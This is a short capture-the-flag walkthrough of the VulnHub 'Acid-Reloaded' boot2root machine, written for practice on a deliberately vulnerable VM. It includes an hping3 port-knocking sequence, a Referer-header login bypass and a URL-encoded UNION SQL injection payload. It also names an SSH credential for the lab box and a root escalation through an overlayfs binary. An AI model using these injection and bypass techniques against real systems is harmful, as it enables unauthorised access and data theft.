###Acid-Reloaded:
    vulnhub.com boot2root
    
  #1) Finger-Printing:
          reveals port 22 and 33447
  
  #2) ssh reveals port-knocking sequence:
          hping3 -S [ip] -p 3 -c 1; hping3 -S [ip] -p 2 -c 1; hping3 -S [ip] -p 1 -c 1
          port 33447 opens
  
  #3) /bin  and bypass login
        login submits form to validation.php --> change referer to http://[vm ip]:33447/bin/includes/validation.php
  
  #4) SQLi:
        sqlmap reveals the id parameter is not sql injectable, which isn't true.
        The following injections reveals all tables in the db:
        - http://ip:33447/bin/l33t_haxor.php?id=-1%27%29%a0union%a0select%a01%2C%a0group_concat%28table_name%29%a0from%a0information_schema.tables%a0where%a0table_schema=%22secure_login%22%23
              result of not accounting for different encodings
        - the interesting table is UB3R/strcpy.exe
  
  #5) Inspect strcpy.exe:
        - it is actually a pdf file that contains a rar and another jpg
          after inspecting the files inside and so on reveals information that can be used for a hydra bruteforce attack
  
  #6) ssh username makke password Noob@123 [revealed in xml obtained from inspecting files in strcpy.exe]
      inspect /home/makke with ls -alRh reveals a hint saying to run the binary
  
  #7) run ./overlayfs in /bin gives root!
  
  Thanks!
